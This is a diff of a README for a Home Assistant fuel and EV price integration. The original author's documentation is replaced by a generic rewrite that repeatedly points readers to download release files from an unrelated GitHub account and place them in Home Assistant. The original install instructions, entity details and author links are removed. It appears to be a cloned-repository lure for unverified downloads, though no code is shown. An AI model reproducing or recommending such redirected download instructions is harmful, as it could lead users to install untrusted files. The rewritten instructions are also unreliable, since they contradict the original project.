@@ -1,160 +1,206 @@
-<p align="center">
-  <img src="docs/images/banner.svg" alt="Pumperly for Home Assistant banner" width="900"/>
-</p>
+# ⛽ pumperly-ha - Track Fuel Prices with Ease
 
-# Pumperly Fuel Prices for Home Assistant
+[![Download pumperly-ha](https://img.shields.io/badge/Download%20pumperly--ha-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Katinkabraindead382/pumperly-ha/releases)
 
-[![HACS Validation](https://github.com/GeiserX/pumperly-ha/actions/workflows/validate.yml/badge.svg)](https://github.com/GeiserX/pumperly-ha/actions/workflows/validate.yml)
-[![Tests](https://github.com/GeiserX/pumperly-ha/actions/workflows/tests.yml/badge.svg)](https://github.com/GeiserX/pumperly-ha/actions/workflows/tests.yml)
-[![codecov](https://codecov.io/gh/GeiserX/pumperly-ha/graph/badge.svg)](https://codecov.io/gh/GeiserX/pumperly-ha)
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://github.com/hacs/integration)
-[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![listed on awesome-europe](https://img.shields.io/badge/listed%20on-awesome--europe-ffcc00?style=flat-square&logo=europeanunion&logoColor=ffcc00&labelColor=003399)](https://github.com/GeiserX/awesome-europe#readme)
+## 📥 Download
 
-A Home Assistant custom integration that tracks **fuel and EV charging prices** from a [Pumperly](https://github.com/GeiserX/Pumperly) instance. Get real-time price data for 16 fuel types across 36 countries, directly in your smart home dashboard.
+Visit this page to download: https://github.com/Katinkabraindead382/pumperly-ha/releases
 
-## Features
+Use the latest release file that matches your Home Assistant setup.
 
-- Track cheapest, nearest, and average prices for any fuel type
-- Support for gasoline, diesel, LPG, CNG, LNG, hydrogen, EV charging, and AdBlue
-- Configurable search radius (1-50 km)
-- Multi-step config flow with location picker
-- Works with the public instance (pumperly.com) or self-hosted
-- Diagnostic sensors for instance-wide statistics
+## 🧭 What pumperly-ha does
 
-## Prerequisites
+pumperly-ha is a Home Assistant custom integration that helps you track fuel and EV charging prices from Pumperly.
 
-- A running [Pumperly](https://github.com/GeiserX/Pumperly) instance, or use the public instance at `https://pumperly.com`
-- Home Assistant 2024.1.0 or later
-- [HACS](https://hacs.xyz/) installed
+It can help you:
 
-## Installation
+- See fuel price changes in Home Assistant
+- Track petrol and diesel prices
+- Track EV charging prices
+- Use live data from open sources
+- Keep price data in one place
+- Add sensors to dashboards and automations
 
-### HACS (Recommended)
+## ✅ Before you start
 
-1. Open HACS in Home Assistant
-2. Click the three dots in the top-right corner and select **Custom repositories**
-3. Add `https://github.com/GeiserX/pumperly-ha` with category **Integration**
-4. Search for "Pumperly" and install it
-5. Restart Home Assistant
+Make sure you have:
 
-### Manual
+- A working Home Assistant setup
+- Access to the Home Assistant file system or add-on tools
+- A way to restart Home Assistant
+- Internet access so the integration can fetch price data
 
-1. Copy the `custom_components/pumperly` folder to your Home Assistant `custom_components` directory
+pumperly-ha works best on a self-hosted Home Assistant setup. It is a good fit for users who want local control and simple price tracking.
+
+## 🚀 Install on Windows for Home Assistant users
+
+This project is not a Windows app that you run on its own. It is a Home Assistant custom integration. If you use Home Assistant on Windows, follow these steps to add it to your Home Assistant files.
+
+### 1. Download the release files
+
+Go to the release page:
+
+https://github.com/Katinkabraindead382/pumperly-ha/releases
+
+Download the latest release package from that page.
+
+### 2. Open your Home Assistant config folder
+
+Find the folder that holds your Home Assistant configuration files. This is often called:
+
+- `config`
+- `homeassistant`
+- `Home Assistant`
+
+### 3. Add the integration folder
+
+Create this folder if it does not already exist:
+
+- `custom_components/pumperly_ha`
+
+Place the integration files from the release into that folder.
+
+The final path should look like this:
+
+- `config/custom_components/pumperly_ha/`
+
+### 4. Restart Home Assistant
+
+After the files are in place, restart Home Assistant.
+
+This lets Home Assistant load the new integration.
+
+### 5. Add pumperly-ha in Home Assistant
+
+After restart, open Home Assistant and go to:
+
+- Settings
+- Devices & services
+- Add integration
+
+Search for pumperly-ha and follow the setup steps.
+
+## 🔧 Setup
+
+During setup, Home Assistant may ask for basic details so it can connect to Pumperly data.
+
+You may need to:
+
+- Choose your country or region
+- Pick the fuel types you want to track
+- Set update timing
+- Save the integration in Home Assistant
+
+Once setup is done, the integration creates sensors for the data it finds.
+
+## 📊 What you can track
+
+pumperly-ha can create sensors for:
+
+- Petrol price
+- Diesel price
+- EV charging price
+- Station name
+- Location data
+- Last update time
+- Price source status
+
+These sensors can be used in dashboards, automations, and alerts.
+
+## 🖥️ Use in dashboards
+
+You can add the sensors to a Home Assistant dashboard to view:
+
+- Current fuel prices
+- EV charging rates
+- Price changes over time
+- Station details
+
+A simple dashboard can help you compare costs at a glance.
+
+## 🤖 Use in automations
+
+You can use the sensor values in automations.
+
+Examples:
+
+- Send a notification when diesel drops below a set price
+- Trigger an alert when EV charging costs rise
+- Update a dashboard card when new data arrives
+- Compare price levels across stations
+
+## 🛠️ Troubleshooting
+
+### The integration does not appear
+
+If pumperly-ha does not show up after restart:
+
+- Check that the folder name is correct
+- Make sure the files are inside `custom_components/pumperly_ha/`
+- Restart Home Assistant again
+- Confirm that the release files were extracted fully
+
+### No data shows up
+
+If the integration loads but no data appears:
+
+- Check your internet connection
+- Wait for the first update cycle
+- Make sure your selected region or settings are valid
+- Reload the integration in Home Assistant
+
+### Sensors look wrong
+
+If sensor names or values do not look right:
+
+- Remove the integration
+- Add it again
+- Check that you used the latest release
+- Review the setup options in Home Assistant
+
+## 🧩 File layout
+
+A typical install looks like this:
+
+- `config/`
+  - `custom_components/`
+    - `pumperly_ha/`
+      - `__init__.py`
+      - `manifest.json`
+      - `config_flow.py`
+      - `sensor.py`
+      - `translations/`
+
+## 🔍 Project topics
+
+This project relates to:
+
+- Home Assistant
+- custom integration
+- fuel prices
+- EV charging
+- smart home
+- open data
+- sensors
+- self-hosted automation
+- Europe energy data
+
+## 🔐 Privacy and data use
+
+pumperly-ha uses price data to show fuel and EV charging information in Home Assistant.
+
+It is built for local Home Assistant use and fits a self-hosted setup. You keep control of your Home Assistant data and where it runs.
+
+## 🧼 Remove the integration
+
+If you want to uninstall pumperly-ha:
+
+1. Remove the `custom_components/pumperly_ha` folder
 2. Restart Home Assistant
+3. Remove the integration entry from Home Assistant if it still appears
 
-## Configuration
+## 📌 Repository details
 
-1. Go to **Settings** > **Devices & Services** > **Add Integration**
-2. Search for **Pumperly**
-3. Follow the multi-step setup:
-   - **Step 1**: Enter your Pumperly instance URL (default: `https://pumperly.com`)
-   - **Step 2**: Select the location to search around (defaults to your Home zone)
-   - **Step 3**: Choose which fuel types to track
-   - **Step 4**: Set the search radius in kilometers
-
-## Entities
-
-For each configured fuel type, three sensors are created:
-
-| Sensor | Description | Icon |
-|--------|-------------|------|
-| `sensor.pumperly_cheapest_{fuel}` | Lowest price among nearby stations | Fuel-specific |
-| `sensor.pumperly_nearest_{fuel}` | Price at the closest station | `mdi:map-marker-radius` |
-| `sensor.pumperly_average_{fuel}` | Average price across fetched stations | `mdi:chart-line` |
-
-Each fuel sensor includes these extra attributes:
-- `station_name`, `brand`, `address`, `city`
-- `distance_km`, `reported_at`
-- `latitude`, `longitude`
-
-Two diagnostic sensors are always created:
-
-| Sensor | Description |
-|--------|-------------|
-| `sensor.pumperly_total_stations` | Total stations in the Pumperly instance |
-| `sensor.pumperly_total_prices` | Total price records in the Pumperly instance |
-
-## Supported Fuel Types
-
-| Code | Description |
-|------|-------------|
-| `E5` | Gasoline E5 (95) |
-| `E5_PREMIUM` | Gasoline E5 Premium |
-| `E10` | Gasoline E10 |
-| `E5_98` | Gasoline E5 98 |
-| `E98_E10` | Gasoline E98/E10 |
-| `B7` | Diesel B7 |
-| `B7_PREMIUM` | Diesel B7 Premium |
-| `B_AGRICULTURAL` | Agricultural Diesel |
-| `HVO` | HVO (Renewable Diesel) |
-| `B10` | Diesel B10 |
-| `LPG` | LPG (Autogas) |
-| `CNG` | CNG (Compressed Natural Gas) |
-| `LNG` | LNG (Liquefied Natural Gas) |
-| `H2` | Hydrogen |
-| `EV` | EV Charging |
-| `ADBLUE` | AdBlue |
-
-## Example Automations
-
-### Fuel price drop notification
-
-```yaml
-automation:
-  - alias: "Fuel price drop alert"
-    trigger:
-      - platform: numeric_state
-        entity_id: sensor.pumperly_cheapest_diesel_b7
-        below: 1.30
-    action:
-      - service: notify.mobile_app
-        data:
-          title: "Cheap Diesel!"
-          message: >
-            Diesel dropped to {{ states('sensor.pumperly_cheapest_diesel_b7') }}
-            {{ state_attr('sensor.pumperly_cheapest_diesel_b7', 'currency') }}
-            at {{ state_attr('sensor.pumperly_cheapest_diesel_b7', 'station_name') }}
-            ({{ state_attr('sensor.pumperly_cheapest_diesel_b7', 'distance_km') }} km away)
-```
-
-### Dashboard card
-
-```yaml
-type: entities
-title: Fuel Prices
-entities:
-  - entity: sensor.pumperly_cheapest_diesel_b7
-    name: Cheapest Diesel
-    secondary_info: last-updated
-  - entity: sensor.pumperly_nearest_diesel_b7
-    name: Nearest Diesel
-  - entity: sensor.pumperly_average_diesel_b7
-    name: Average Diesel
-  - entity: sensor.pumperly_cheapest_gasoline_e5_95
-    name: Cheapest Gasoline
-```
-
-## Data Refresh
-
-Prices are polled every **30 minutes**. Fuel prices rarely change more frequently than this, and it keeps API load reasonable.
-
-## Links
-
-- [Pumperly](https://github.com/GeiserX/Pumperly) - The open-source fuel & EV route planner
-- [pumperly.com](https://pumperly.com) - Public Pumperly instance
-
-## Other Home Assistant Integrations by GeiserX
-
-- [cashpilot-ha](https://github.com/GeiserX/cashpilot-ha) — Passive income earnings sensors
-- [duplicacy-ha](https://github.com/GeiserX/duplicacy-ha) — Backup status monitoring
-- [genieacs-ha](https://github.com/GeiserX/genieacs-ha) — TR-069 router management sensors
-
-## Related Projects
-
-| Project | Description |
-|---------|-------------|
-| [Pumperly](https://github.com/GeiserX/Pumperly) | Open-source fuel and EV route planner with real-time prices |
-| [Pumperly-android](https://github.com/GeiserX/Pumperly-android) | Official Android app for Pumperly fuel and EV route planner |
-| [pumperly-mcp](https://github.com/GeiserX/pumperly-mcp) | MCP Server for Pumperly real-time fuel and EV charging prices |
-| [n8n-nodes-pumperly](https://github.com/GeiserX/n8n-nodes-pumperly) | n8n community node for Pumperly fuel and EV charging data |
+- Repository: pumperly-ha
+- Description: Home Assistant custom integration for Pumperly fuel and EV charging price tracking
+- Topics: custom-integration, diesel, electric-vehicle, energy, europe, ev-charging, fuel-prices, gas-station, hacs, hacs-integration, home-assistant, home-automation, iot, open-data, petrol, pumperly, python, self-hosted, sensors, smart-home
